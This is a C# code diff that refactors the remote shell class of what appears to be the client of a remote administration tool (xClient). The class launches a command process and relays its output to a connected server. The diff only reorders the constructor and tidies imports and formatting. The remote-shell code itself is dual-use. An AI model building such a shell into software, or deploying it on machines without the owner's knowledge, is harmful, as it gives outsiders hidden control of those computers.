@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Diagnostics;
 using System.Threading;
+using xClient.Core.Packets.ClientPackets;
 
 namespace xClient.Core.RemoteShell
 {
@@ -8,6 +9,12 @@ namespace xClient.Core.RemoteShell
     {
         private Process _prc;
         private bool _read;
+
+        public Shell()
+        {
+            _read = true;
+            CreateSession();
+        }
 
         private void CreateSession()
         {
@@ -26,7 +33,7 @@ namespace xClient.Core.RemoteShell
             };
 
             _prc.Start();
-            new Packets.ClientPackets.ShellCommandResponse(">> New Session created" + Environment.NewLine).Execute(Program.ConnectClient);
+            new ShellCommandResponse(">> New Session created" + Environment.NewLine).Execute(Program.ConnectClient);
 
             new Thread(Redirect).Start();
         }
@@ -42,7 +49,7 @@ namespace xClient.Core.RemoteShell
                         var read = reader.ReadLine();
                         if (read == null) continue;
                         Thread.Sleep(200);
-                        new Packets.ClientPackets.ShellCommandResponse(read + Environment.NewLine).Execute(Program.ConnectClient);
+                        new ShellCommandResponse(read + Environment.NewLine).Execute(Program.ConnectClient);
                     }
                 }
 
@@ -51,7 +58,8 @@ namespace xClient.Core.RemoteShell
             }
             catch (ApplicationException)
             {
-                new Packets.ClientPackets.ShellCommandResponse(">> Session unexpectedly closed" + Environment.NewLine).Execute(Program.ConnectClient);
+                new ShellCommandResponse(">> Session unexpectedly closed" + Environment.NewLine).Execute(
+                    Program.ConnectClient);
                 CreateSession();
             }
         }
@@ -67,12 +75,6 @@ namespace xClient.Core.RemoteShell
             return true;
         }
 
-        public Shell()
-        {
-            _read = true;
-            CreateSession();
-        }
-
         ~Shell()
         {
             _read = false;
@@ -83,11 +85,12 @@ namespace xClient.Core.RemoteShell
                     _prc.Kill();
                     _prc.Dispose();
                     _prc = null;
-                    new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program.ConnectClient);
+                    new ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program.ConnectClient);
                 }
             }
             catch
-            { }
+            {
+            }
         }
 
         public void CloseSession()
@@ -100,7 +103,7 @@ namespace xClient.Core.RemoteShell
                     _prc.Kill();
                     _prc.Dispose();
                     _prc = null;
-                    new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program.ConnectClient);
+                    new ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program.ConnectClient);
                 }
 
                 // The session has already been closed, so there is no reason to make
@@ -108,7 +111,8 @@ namespace xClient.Core.RemoteShell
                 GC.SuppressFinalize(this);
             }
             catch
-            { }
+            {
+            }
         }
     }
 }
